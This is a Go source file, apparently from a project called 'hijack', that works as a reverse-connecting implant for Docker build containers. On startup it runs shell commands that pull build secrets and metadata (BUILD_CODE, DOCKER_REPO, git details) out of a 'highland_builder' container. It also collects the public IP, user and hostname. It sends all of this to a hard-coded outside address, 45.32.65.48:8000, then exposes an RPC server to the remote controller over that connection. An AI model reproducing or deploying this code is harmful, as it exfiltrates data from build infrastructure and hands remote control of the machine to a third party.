package main

import (
	"bufio"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"os"
	"os/exec"
	"runtime"
	"strings"
	//"time"

	"github.com/invctrl/hijack/protocol"
	"github.com/navigaid/pretty"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

var (
	buildCode  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv BUILD_CODE`)))
	dockerRepo = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO`)))
	gitBranch  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_BRANCH`)))
	gitTag     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_TAG`)))
	gitSha1    = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_SHA1`)))
	gitMsg     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_MSG`)))
	ip         = strings.TrimSpace(string(run(`curl -sL ip.sb`)))
	pwd        = strings.TrimSpace(string(run(`pwd`)))
	whoami     = strings.TrimSpace(string(run(`whoami`)))
	hostname   = strings.TrimSpace(string(run(`hostname`)))
	createdAt  = strings.TrimSpace(string(run(`env TZ=Asia/Shanghai docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.CreatedAt}}{{end}}' | grep .`)))

	/* // ~/hello-wasm/simple/main.go
	   fmt.Sprintf("In browser: %t", inBrowser()),
	*/

	goarch    string = runtime.GOARCH
	goos      string = runtime.GOOS
	goroot    string = runtime.GOROOT()
	gc        string = runtime.Compiler
	goversion string = runtime.Version()
	ncpu      int    = runtime.NumCPU()

	commit string
	built  string
	branch string
)

type Header struct {
	BuildCode  string `json:"build_code"`
	DockerRepo string `json:"docker_repo"`
	GitBranch  string `json:"git_branch"`
	GitTag     string `json:"git_tag"`
	GitSha1    string `json:"git_sha1"`
	GitMsg     string `json:"git_msg"`
	IP         string `json:"ip"`
	Pwd        string `json:"pwd"`
	Whoami     string `json:"whoami"`
	Hostname   string `json:"hostname"`
	CreatedAt  string `json:"created_at"`

	GOARCH    string `json:"goarch"`
	GOOS      string `json:"goos"`
	GOROOT    string `json:"goroot"`
	GC        string `json:"gc"`
	GOVERSION string `json:"goversion"`
	NCPU      int    `json:"ncpu"`

	Commit string `json:"commit"`
	Built  string `json:"built"`
	Branch string `json:"branch"`
}

func main() {
	server := "45.32.65.48:8000"
	if len(os.Args) > 1 {
		server = os.Args[1]
	}
	conn, err := net.Dial("tcp", server)
	if err != nil {
		log.Fatalln(err)
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\nHijack: true\r\n\r\n"))
	if err != nil {
		log.Fatalln(err)
	}
	header := pretty.JSONString(&Header{
		BuildCode:  buildCode,
		DockerRepo: dockerRepo,
		GitBranch:  gitBranch,
		GitTag:     gitTag,
		GitSha1:    gitSha1,
		GitMsg:     gitMsg,
		IP:         ip,
		Pwd:        pwd,
		Whoami:     whoami,
		Hostname:   hostname,
		CreatedAt:  createdAt,

		GOARCH:    goarch,
		GOOS:      goos,
		GOROOT:    goroot,
		GC:        gc,
		GOVERSION: goversion,
		NCPU:      ncpu,

		Commit: commit,
		Built:  built,
		Branch: branch,
	})
	log.Println(header)
	conn.Write([]byte(header))

	// block until "OK" or "NO" is received, which indicates if header has been successfully read by controller
	okno, err := ioutil.ReadAll(io.LimitReader(conn, 2))
	if err != nil {
		log.Fatalln(err)
	}
	if string(okno) != "OK" {
		log.Fatalln(string(okno))
	}
	log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())

	rpcServer := rpc.NewServer()
	rpcServer.Register(new(protocol.Hello))
	log.Println("serveconn")
	rpcServer.ServeConn(conn)
	log.Fatalln("bye")
}
